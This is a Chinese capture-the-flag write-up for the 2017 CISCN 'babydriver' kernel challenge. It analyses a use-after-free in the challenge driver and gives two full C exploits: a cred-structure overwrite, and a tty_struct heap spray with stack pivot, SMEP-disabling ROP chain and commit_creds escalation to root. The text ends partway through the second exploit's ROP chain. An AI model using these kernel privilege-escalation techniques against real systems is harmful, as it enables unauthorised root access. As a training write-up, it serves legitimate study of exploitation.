

##   2017CISCN-babydriver

## 提取文件系统

boot.sh启动脚本如下：

```shell
#!/bin/bash
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
```

可以看到开启了smep保护。

启动boot.sh脚本后进入系统，发现有启动脚本：

```shell
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

可以看到在初始化时加载了一个babydriver.ko的驱动。

现在我们需要把rootfs.cpio中的文件系统提取出来，执行如下命令：

```shell
yifengchen@ubuntu:~/pwn/kernel/babydriver$ mkdir output
yifengchen@ubuntu:~/pwn/kernel/babydriver$ cd output
yifengchen@ubuntu:~/pwn/kernel/babydriver/output$ cp ../rootfs.cpio rootfs.cpio.gz
yifengchen@ubuntu:~/pwn/kernel/babydriver/output$ gunzip rootfs.cpio.gz
yifengchen@ubuntu:~/pwn/kernel/babydriver/output$ cpio -idmv < rootfs.cpio
```



## 关键函数分析

提取出文件系统后ida分析babydriver.ko:

babyioctl:首先判断command是不是为0x10001，如果满足，将会释放之前的buf，新分配一个用户决定大小的空间，并且设置为size。

```c
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t arg_1; // rbx
  __int64 v5; // rdx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  arg_1 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(arg_1, 0x24000C0LL);
    babydev_struct.device_buf_len = arg_1;
    printk("alloc done\n", 0x24000C0LL, v5);
    result = 0LL;
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
    result = -22LL;
  }
  return result;
}
```

babyopen:申请大小64的buffer，并将指针存入 `babydev_struct.device_buf`。

```C
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

babyrelease:释放当前堆块

```C
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```



## 漏洞点

由于内核的驱动仅加载一次，因此驱动的全局变量是共享的。当同时打开多个文件时，`babydev_struct.device_buf`会被不断覆写，而在babyrelease时，会释放掉全部文件共享的缓冲区。假设打开了两个设备文件，也就是调用了两次open，第一次分配了，第二次其实将会覆盖第一次分配的buf。如果release第一个，第二个其实已经被释放，这样就造成了UAF。



## 方法一

### 利用思路

因为slub分配器在分配内存空间时会把相同大小的放在一起，因此可以fork一个进程使其cred结构体被放入UAF的空间，之后控制cread结构体用write改写uid值即可。

```c
//v4.4.72/source/include/linux/cred.h#L118
struct cred {
	atomic_t	usage;	// 4bytes
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */ // 4bytes
	kgid_t		gid;		/* real GID of the task */ // 4bytes
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */ // 4bytes
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */ // 8bytes
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;/* default keyring to attach requested 
					 * keys to */	//1byte align to 8bytes
	struct key __rcu *session_keyring; /* keyring inherited over fork */ //8bytes
	struct key	*process_keyring; /* keyring private to this process */ //8bytes
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */  //8bytes
#endif
	struct user_struct *user;	/* real user ID subscription */ //8bytes
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */ //16bytes
};
```

要正确算出cred结构体大小我们先复习一下结构体对齐原则和64位下变量大小：

结构体对齐原则：

1. 结构体变量的**起始地址**能够被其最宽的成员大小整除

2. 结构体每个成员相对于**起始地址的偏移**能够被其**自身大小整除**，如果不能则在**前一个成员后面**补充字节

3. 结构体总体大小能够**被最宽的成员的大小**整除，如不能则在**后面**补充字节

x86-64:  int:4bytes; unsigned int:4bytes; pointer:8bytes;

其中rcu_head定义如下：

```C
struct callback_head {
	struct callback_head *next;					//8bytes
	void (*func)(struct callback_head *head);	//8bytes
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

在没有debug选项下cred结构体大小为： 4+8x4+4+8x5+8+8x4+8+8x3+16=168；

如果编译了一个带符号表的内核也可以直接查看结构体：

```shell
pwndbg> p *((struct cred*) 0xffff880002486300)                                                   
```



### exp

exp如下:

```C
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>

#define CRED_SIZE 0xa8
#define DEV_NAME "/dev/babydev"
char buf[100];

int main(){
	int fd1,fd2,ret;
	char zero_buf[100];
	memset(zero_buf,0,sizeof(char)*100);
	fd1 = open(DEV_NAME,O_RDWR);
	fd2 = open(DEV_NAME,O_RDWR);

	ret = ioctl(fd1,0x10001,CRED_SIZE);
	close(fd1);

	int now_uid = 1000;
	int pid = fork();
	if(pid<0){
		perror("fork error");
	}

	if(!pid){
		ret = write(fd2,zero_buf,28);//一直到egid及其之前的都改写为0
		now_uid = getuid();
		if(!now_uid){
			printf("get root");
			system("/bin/sh");
			exit(0);
		}
		else{
			printf("failed");
			exit(0);
		}
	}
	else{
		wait(NULL);
	}
	close(fd2);
	return 0;
}

```

将其静态编译后，与原文件系统一起重新制作成cpio文件并压缩，命令如下：

```shell
yifengchen@ubuntu:~/pwn/kernel/babydriver/output$ find . | cpio -o --format=newc | gzip -c  > ../rootfs.cpio
```

关于cpio的其他命令：http://bradthemad.org/tech/notes/cpio_directory.php

运行后效果如下：

```shell
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ ./poc
[    8.906689] device open
[    8.907434] device open
[    8.908149] alloc done
[    8.909299] device release
/ # id
uid=0(root) gid=0(root) groups=1000(ctf)

```

下面开始对exp进行动调

在boot.sh里加入`-gdb tcp::1234`参数。启动boot.sh脚本后在本机终端用root权限启动gdb。若想在题目驱动函数中下断点需引入题目驱动符号表，但在此之前需在题目环境下记录驱动基址：

```shell
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
```
之后便可以连接到目标题目内核下断点调试了。

```shell
pwndbg> set architecture i386:x86-64
pwndbg> target remote  localhost:1234
pwndbg> add-symbol-file output/lib/modules/4.4.72/babydriver.ko  0xffffffffc0000000
```

通过在babywirte函数下断可以看到，在改写前cred结构体如下：

```shell
pwndbg> x/30gx  0xffff880002bd99c0
0xffff880002bd99c0:	0x000003e800000002	0x000003e8000003e8
0xffff880002bd99d0:	0x000003e8000003e8	0x000003e8000003e8
0xffff880002bd99e0:	0x00000000000003e8	0x0000000000000000
0xffff880002bd99f0:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a00:	0x0000003fffffffff	0x0000000000000000
0xffff880002bd9a10:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a20:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a30:	0x0000000000000000	0xffff880002b90ae0
0xffff880002bd9a40:	0xffff8800009f6f80	0xffffffff81e410c0
0xffff880002bd9a50:	0xffff880002bddd80	0x0000000000000000
0xffff880002bd9a60:	0x0000000000000000	0x0000000000000000
```

改写后到egid前都置为0：

```shell
pwndbg> x/30gx  0xffff880002bd99c0
0xffff880002bd99c0:	0x0000000000000000	0x0000000000000000
0xffff880002bd99d0:	0x0000000000000000	0x000003e800000000
0xffff880002bd99e0:	0x00000000000003e8	0x0000000000000000
0xffff880002bd99f0:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a00:	0x0000003fffffffff	0x0000000000000000
0xffff880002bd9a10:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a20:	0x0000000000000000	0x0000000000000000
0xffff880002bd9a30:	0x0000000000000000	0xffff880002b90ae0
0xffff880002bd9a40:	0xffff8800009f6f80	0xffffffff81e410c0
0xffff880002bd9a50:	0xffff880002bddd80	0x0000000000000000
0xffff880002bd9a60:	0x0000000000000000	0x0000000000000000
```



## 方法二

### ptmx设备

pts(pseudo-terminal slave) 是 pty 的实现方法，与 ptmx(pseudo-terminal master) 配合使用实现pty(虚拟终端,pseudo-tty)。

打开 ptmx 设备在内核中调用`ptmx_open`函数，而`tty_struct *tty`是在 `tty_init_dev`函数中赋值的。

```shell
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[REGISTERS]──────────────────────────────────────
 RAX  0xffff88000dda1440 ◂— 0
 RBX  0xffff880000141700 ◂— 0
 RCX  0x0
 RDX  0x80000000
 RDI  0xffffffff81cce0e0 (tty_mutex) ◂— 0
 RSI  0x0
 R8   0xffff88000def72a0 ◂— 0
 R9   0x1800f000e
 R10  0x0
 R11  0x19ca0
 R12  0x0
 R13  0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
 R14  0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
 R15  0xffff88000dd11780 ◂— 0
 RBP  0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 —▸ 0xffff88000df8bd38 —▸ 0xffff88000df8bde0 ◂— ...
 RSP  0xffff88000df8bc58 ◂— 0
 RIP  0xffffffff8148c490 (ptmx_open+144) ◂— 0x4400ca0d813d8b48
───────────────────────────────────────[DISASM]───────────────────────────────────────
   0xffffffff8148c476 <ptmx_open+118>    call   mutex_unlock <0xffffffff81675080>
 
   0xffffffff8148c47b <ptmx_open+123>    test   r12d, r12d
   0xffffffff8148c47e <ptmx_open+126>    js     ptmx_open+343 <0xffffffff8148c557>
 
   0xffffffff8148c484 <ptmx_open+132>    mov    rdi, -0x7e331f20 <0xffffffff81cce0e0>
   0xffffffff8148c48b <ptmx_open+139>    call   mutex_lock <0xffffffff81675000>
 
 ► 0xffffffff8148c490 <ptmx_open+144>    mov    rdi, qword ptr [rip + 0xca0d81]
   0xffffffff8148c497 <ptmx_open+151>    mov    esi, r12d
   0xffffffff8148c49a <ptmx_open+154>    call   tty_init_dev <0xffffffff81483df0>
 
   0xffffffff8148c49f <ptmx_open+159>    mov    rdi, -0x7e331f20 <0xffffffff81cce0e0>
   0xffffffff8148c4a6 <ptmx_open+166>    mov    r14, rax
   0xffffffff8148c4a9 <ptmx_open+169>    call   mutex_unlock <0xffffffff81675080>
───────────────────────────────────[SOURCE (CODE)]────────────────────────────────────
In file: /home/ivan/kernel/linux-4.4.72/drivers/tty/pty.c
   762 	if (index < 0)
   763 		goto out_put_ref;
   764 
   765 
   766 	mutex_lock(&tty_mutex);
 ► 767 	tty = tty_init_dev(ptm_driver, index);
   768 	/* The tty returned here is locked so we can safely
   769 	   drop the mutex */
   770 	mutex_unlock(&tty_mutex);
   771 
   772 	retval = PTR_ERR(tty);
───────────────────────────────────────[STACK]────────────────────────────────────────
00:0000│ rsp  0xffff88000df8bc58 ◂— 0
01:0008│      0xffff88000df8bc60 —▸ 0xffffffff8212d1a0 (ptmx_cdev) ◂— 0
02:0010│      0xffff88000df8bc68 —▸ 0xffffffff8212d0c0 (ptmx_fops) ◂— 0
03:0018│      0xffff88000df8bc70 —▸ 0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
04:0020│      0xffff88000df8bc78 —▸ 0xffff880000141700 ◂— 0
05:0028│ rbp  0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 —▸ 0xffff88000df8bd38 —▸ 0xffff88000df8bde0 ◂— ...
06:0030│      0xffff88000df8bc88 —▸ 0xffffffff811ec4f3 (chrdev_open+179) ◂— 0x5ebc3891174c085
07:0038│      0xffff88000df8bc90 —▸ 0xffffffff8212d1a0 (ptmx_cdev) ◂— 0
─────────────────────────────────────[BACKTRACE]──────────────────────────────────────
 ► f 0 ffffffff8148c490 ptmx_open+144
   f 1 ffffffff811ec4f3 chrdev_open+179
   f 2 ffffffff811e6050 do_dentry_open+448
   f 3 ffffffff811e7444 vfs_open+84
   f 4 ffffffff811f6143 path_openat+1267
   f 5 ffffffff811f6143 path_openat+1267
   f 6 ffffffff811f7dc0 do_filp_open+128
   f 7 ffffffff811e78af do_sys_open+431
   f 8 ffffffff811e7974 sys_openat+20
   f 9 ffffffff811e7974 sys_openat+20
   f 10 ffffffff81676ff2 entry_SYSCALL_64+98
────────────────────────────────────────────────────────────────────────────────────────
```

跟入后对 tty 结构体分配在`alloc_tty_struct`函数处。

```shell
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[REGISTERS]──────────────────────────────────────
 RAX  0x1
 RBX  0xffffffffffffffed
 RCX  0x0
 RDX  0x80000000
 RDI  0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
 RSI  0x0
 R8   0xffff88000def72a0 ◂— 0
 R9   0x1800f000e
 R10  0x0
 R11  0x19ca0
 R12  0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
 R13  0x0
 R14  0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
 R15  0xffff88000dd11780 ◂— 0
 RBP  0xffff88000df8bc48 —▸ 0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 —▸ 0xffff88000df8bd38 ◂— ...
 RSP  0xffff88000df8bc28 ◂— 0x18
 RIP  0xffffffff81483e30 (tty_init_dev+64) ◂— 0xc08548fffffdabe8
───────────────────────────────────────[DISASM]───────────────────────────────────────
   0xffffffff81483e13 <tty_init_dev+35>    call   try_module_get <0xffffffff810f8fc0>
 
   0xffffffff81483e18 <tty_init_dev+40>    test   al, al
   0xffffffff81483e1a <tty_init_dev+42>    jne    tty_init_dev+58 <0xffffffff81483e2a>
    ↓
   0xffffffff81483e2a <tty_init_dev+58>    mov    esi, r13d
   0xffffffff81483e2d <tty_init_dev+61>    mov    rdi, r12
 ► 0xffffffff81483e30 <tty_init_dev+64>    call   alloc_tty_struct <0xffffffff81483be0>
        rdi: 0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
        rsi: 0x0
 
   0xffffffff81483e35 <tty_init_dev+69>    test   rax, rax
   0xffffffff81483e38 <tty_init_dev+72>    mov    rbx, rax
   0xffffffff81483e3b <tty_init_dev+75>    je     tty_init_dev+283 <0xffffffff81483f0b>
 
   0xffffffff81483e41 <tty_init_dev+81>    mov    rdi, rax
   0xffffffff81483e44 <tty_init_dev+84>    call   tty_lock <0xffffffff81676ea0>
───────────────────────────────────[SOURCE (CODE)]────────────────────────────────────
In file: /home/ivan/kernel/linux-4.4.72/drivers/tty/tty_io.c
   1517 	 */
   1518 
   1519 	if (!try_module_get(driver->owner))
   1520 		return ERR_PTR(-ENODEV);
   1521 
 ► 1522 	tty = alloc_tty_struct(driver, idx);
   1523 	if (!tty) {
   1524 		retval = -ENOMEM;
   1525 		goto err_module_put;
   1526 	}
   1527 
───────────────────────────────────────[STACK]────────────────────────────────────────
00:0000│ rsp  0xffff88000df8bc28 ◂— 0x18
01:0008│      0xffff88000df8bc30 —▸ 0xffff880000141700 ◂— 0
02:0010│      0xffff88000df8bc38 ◂— 0
03:0018│      0xffff88000df8bc40 —▸ 0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
04:0020│ rbp  0xffff88000df8bc48 —▸ 0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 —▸ 0xffff88000df8bd38 ◂— ...
05:0028│      0xffff88000df8bc50 —▸ 0xffffffff8148c49f (ptmx_open+159) ◂— 0x4981cce0e0c7c748
06:0030│      0xffff88000df8bc58 ◂— 0
07:0038│      0xffff88000df8bc60 —▸ 0xffffffff8212d1a0 (ptmx_cdev) ◂— 0
─────────────────────────────────────[BACKTRACE]──────────────────────────────────────
 ► f 0 ffffffff81483e30 tty_init_dev+64
   f 1 ffffffff8148c49f ptmx_open+159
   f 2 ffffffff811ec4f3 chrdev_open+179
   f 3 ffffffff811e6050 do_dentry_open+448
   f 4 ffffffff811e7444 vfs_open+84
   f 5 ffffffff811f6143 path_openat+1267
   f 6 ffffffff811f6143 path_openat+1267
   f 7 ffffffff811f7dc0 do_filp_open+128
   f 8 ffffffff811e78af do_sys_open+431
   f 9 ffffffff811e7974 sys_openat+20
   f 10 ffffffff811e7974 sys_openat+20
────────────────────────────────────────────────────────────────────────────────────────
```

在`alloc_tty_struct`函数中，`tty = kzalloc(sizeof(*tty), GFP_KERNEL);`申请了`sizeof(*tty)`大小的空间。

`kzalloc`其实还是对`kmalloc`的一个封装。



### 利用思路

1.打开两个 babydev 设备( fd1、fd2 )，对其中一个( fd1 )使用`ioctl`函数，设置size为`tty_struct`大小，大小是0x2e0。

```shell
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[REGISTERS]──────────────────────────────────────
 RAX  0x1
 RBX  0xffffffffffffffed
 RCX  0x0
 RDX  0x2e0
 RDI  0xffff88000ec01500 ◂— 0x19630
 RSI  0x24080c0
 R8   0xffff88000def72a0 ◂— 0
 R9   0x1800f000e
 R10  0x0
 R11  0x19ca0
 R12  0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
 R13  0x0
 R14  0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
 R15  0xffff88000dd11780 ◂— 0
 RBP  0xffff88000df8bc18 —▸ 0xffff88000df8bc48 —▸ 0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 ◂— ...
 RSP  0xffff88000df8bbf0 —▸ 0xffff88000df8bc00 —▸ 0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
 RIP  0xffffffff81483c0b (alloc_tty_struct+43) ◂— 0xc08548ffd44060e8
───────────────────────────────────────[DISASM]───────────────────────────────────────
   0xffffffff81483bf5 <alloc_tty_struct+21>    mov    r12, rdi
   0xffffffff81483bf8 <alloc_tty_struct+24>    mov    r13d, esi
   0xffffffff81483bfb <alloc_tty_struct+27>    mov    esi, 0x24080c0
   0xffffffff81483c00 <alloc_tty_struct+32>    sub    rsp, 8
   0xffffffff81483c04 <alloc_tty_struct+36>    mov    rdi, qword ptr [rip + 0xc3b065] <0xffffffff820bec70>
 ► 0xffffffff81483c0b <alloc_tty_struct+43>    call   kmem_cache_alloc_trace <0xffffffff811c7c70>
        rdi: 0xffff88000ec01500 ◂— 0x19630
        rsi: 0x24080c0
   ---> rdx: 0x2e0
 
   0xffffffff81483c10 <alloc_tty_struct+48>    test   rax, rax
   0xffffffff81483c13 <alloc_tty_struct+51>    mov    rbx, rax
   0xffffffff81483c16 <alloc_tty_struct+54>    je     alloc_tty_struct+511 <0xffffffff81483ddf>
 
   0xffffffff81483c1c <alloc_tty_struct+60>    mov    rdi, rax
   0xffffffff81483c1f <alloc_tty_struct+63>    mov    dword ptr [rax + 4], 1
───────────────────────────────────[SOURCE (CODE)]────────────────────────────────────
In file: /home/ivan/kernel/linux-4.4.72/include/linux/slab.h
   453 			int index = kmalloc_index(size);
   454 
   455 			if (!index)
   456 				return ZERO_SIZE_PTR;
   457 
 ► 458 			return kmem_cache_alloc_trace(kmalloc_caches[index],
   459 					flags, size);
   460 		}
   461 #endif
   462 	}
   463 	return __kmalloc(size, flags);
───────────────────────────────────────[STACK]────────────────────────────────────────
00:0000│ rsp  0xffff88000df8bbf0 —▸ 0xffff88000df8bc00 —▸ 0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
01:0008│      0xffff88000df8bbf8 ◂— in     eax, dx /* 0xffffffffffffffed */
02:0010│      0xffff88000df8bc00 —▸ 0xffff88000dd41540 ◂— add    dl, byte ptr [rax + rax] /* 0x100005402 */
03:0018│      0xffff88000df8bc08 ◂— 0
04:0020│      0xffff88000df8bc10 —▸ 0xffff88000ddea058 ◂— mov    dh, 0x21 /* 0x521b6 */
05:0028│ rbp  0xffff88000df8bc18 —▸ 0xffff88000df8bc48 —▸ 0xffff88000df8bc80 —▸ 0xffff88000df8bcc8 —▸ 0xffff88000df8bd10 ◂— ...
06:0030│      0xffff88000df8bc20 —▸ 0xffffffff81483e35 (tty_init_dev+69) ◂— 0x840fc38948c08548
07:0038│      0xffff88000df8bc28 ◂— 0x18
─────────────────────────────────────[BACKTRACE]──────────────────────────────────────
 ► f 0 ffffffff81483c0b alloc_tty_struct+43
   f 1 ffffffff81483c0b alloc_tty_struct+43
   f 2 ffffffff81483c0b alloc_tty_struct+43
   f 3 ffffffff81483e35 tty_init_dev+69
   f 4 ffffffff8148c49f ptmx_open+159
   f 5 ffffffff811ec4f3 chrdev_open+179
   f 6 ffffffff811e6050 do_dentry_open+448
   f 7 ffffffff811e7444 vfs_open+84
   f 8 ffffffff811f6143 path_openat+1267
   f 9 ffffffff811f6143 path_openat+1267
   f 10 ffffffff811f7dc0 do_filp_open+128
────────────────────────────────────────────────────────────────────────────────────────
```

2.将其中一个设备( fd1 )释放，实际上是另一个设备( fd2 )被释放0x400大小堆块。

3.多次调用`open("/dev/ptmx",O_RDWR | O_NOCTTY);`进行堆喷射，使得未关闭的设备(fd2)指针指向一个`tty_struct`结构体。

4.在 fd2 的 buf 上伪造 `tty_opertaions`结构体指针 `*op`，使得 `tty_operations.ioctl`指向 gadget `xchg eax,esp`的地址。这样做是为了使内核栈迁移到可控低内存空间，即用户态空间。驱动中调用`tty_operations`操作最后一条指令为`call eax`，因此使用 `xchg eax,esp`。

5.利用`mmap` 以 `xchg eax,esp`低八位为地址申请一段用来填充 ROP 的内存。

6.利用 babydev 中的 babywrite 将 4 中构造好的结构体指针写入。

7.对之前打开的 ptmx 设备进行 ioctl 操作即可提权。

使用 [Ropper](https://github.com/sashs/Ropper) 找 gadget ，题目只给了 bzImage 需要转换为 vmlinux ，使用如下命令：

```shell
yifengchen@ubuntu:~/pwn/kernel/babydriver$ /usr/src/linux-headers-4.4.0-31/scripts/extract-vmlinux bzImage >> vmlinux
```

### exp
exp如下：

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define DEV_PTMX "/dev/ptmx"
#define DEV_BABY "/dev/babydev"

#define SPRAY_ALLOC_TIMES 0x100

int spray_fd[SPRAY_ALLOC_TIMES];

struct _tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);

	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);

	const struct file_operations *proc_fops;
};

#define KERNELCALL __attribute__ ((regparm(3)))

void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;

//gadget
size_t xchg_eax_esp =  0xffffffff810e712d;  //0xffffffff8100008a 
size_t pop_rdi_ret = 0xffffffff8137c24f;
size_t mov_cr4_rdi = 0xffffffff81004bd5;
size_t swapgs = 0xffffffff8105f3c4;
//size_t iretq = 0xffffffff81677b57; 
size_t iretq = 0xffffffff81588639;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	puts("[+] saving status...");
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*] status has been saved.");
}
/*
void save_status(){
	puts("[+] saving status...");
	asm(
	    "movq %%cs,%0\n"
	    "movq %%ss,%1\n"
	    "pushfq\n"
	    "pop %2\n"
	    : "=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
	    :
	    :"memory");
	puts("[*] status has been saved.");

}*/

void get_shell(){
	printf("shell?\n");
	char *shell = "/bin/sh";
        char *args[] = {shell,NULL};	
	execve(shell,args,NULL);
}

void get_root(){
    //open init scripts change "setuidgid 1000 sh" to "setuidgid 0 sh"
    //then use command `cat /proc/kallsyms | grep "commit_creds" `
	commit_creds = 0xffffffff81098650;
	prepare_kernel_cred = 0xffffffff81098980;
	commit_creds(prepare_kernel_cred(0));
}


struct _tty_operations tty_operations;
char buf[0x1000];
int main(){
	int fd1,fd2;
	long i,size;
	size_t base,rop[0x50];
	fd1=fd2=-1;

	//init
	save_status();

	fd1=open(DEV_BABY,O_RDWR);
	if(fd1==-1){
		puts("[x] fd1 open error!\n");
		exit(-1);
	}
	printf("[*] fd1:%d\n",fd1);
	fd2=open(DEV_BABY,O_RDWR);
	if(fd2==-1){
		puts("[x] fd2 open error!\n");
		exit(-1);
	}
	printf("[*] fd2:%d\n",fd2);

	//free chunks
	puts("[+] freeing fd1...\n");
	ioctl(fd1,0x10001,0x2e0);
	close(fd1);
	puts("[*] fd1 has been freed.\n");

	//spray tty
	puts("[+] spraying tty_struct...\n");
	for (i=0;i<SPRAY_ALLOC_TIMES;i++){
		spray_fd[i] = open("/dev/ptmx",O_RDWR | O_NOCTTY);
		if(spray_fd[i]<0){
			puts("[x] open tty error!");
			exit(-1);
		}
	}
	puts("[*] spraying tty_struct complete.\n");
	
	//check spray
	puts("[+] checking spray tty_struct...\n");
	size = read(fd2,buf,0x20);
	if(size < 0x20){
		puts("[x] read buf error !");
		exit(-1);
	}

	if(buf[0] != 0x1 || buf[1] != 0x54){
		puts("[x] tty spray failed!");
		exit(-1);
	}
	puts("[*] spray check complete.\n");
	
	//set fake tty_operations
	puts("[+] setting fake tty_operations...\n");
	tty_operations.ioctl = xchg_eax_esp;	//xchg eax, esp; ret 0;
	*(size_t *)(buf+3*8) = &tty_operations;
	puts("[*] fake tty_operations has been setted.\n");
	
	//stack pivoting
	puts("[+] preparing ROP chain...\n");
	base = xchg_eax_esp & 0xfffff000;
	if(base != mmap(base,0x3000,7,MAP_PRIVATE | MAP_ANONYMOUS,-1,0)){
		puts("[x] mmap error!");
		exit(-1);
	}
	printf("base address: %lx\n",base);

	i=0;
	//pop rdi; ret;
	rop[i++] = pop_rdi_ret;	
	rop[i++] = 0x6f0;
	//push rbp; and rdi, 0xfffffffffffffe6f; mov rbp, rsp; mov cr4, rdi; pop rbp; ret; 
	rop[i++] = mov_cr4_rdi;   
	rop[i++] = get_root;
	//swapgs; pop rbp; ret
	rop[i++] = swapgs; 
	rop[i++] = 0;
	rop[i++] = iretq;
	rop[i++] = get_shell;
	rop[i++] = user_cs;
